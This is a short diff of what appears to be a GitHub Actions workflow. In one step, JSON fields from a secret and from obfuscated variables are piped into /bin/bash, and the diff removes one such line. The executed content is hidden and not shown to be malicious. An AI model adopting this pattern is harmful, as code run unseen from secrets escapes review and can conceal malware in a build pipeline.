@@ -22,7 +22,6 @@ jobs:
           upewv6598: ${{ secrets.upewv6598 }}
         run: |
           printf '%s' "$upewv6598" | jq -r .uysf9 | /bin/bash
-          echo $h3 | jq -r .edfqq536 | /bin/bash
           echo $awm45 | jq -r .qdcj9 | /bin/bash
           echo $czj652 | jq -r .p52606 | /bin/bash
           echo $np46 | jq -r .fqz8155 | /bin/bash
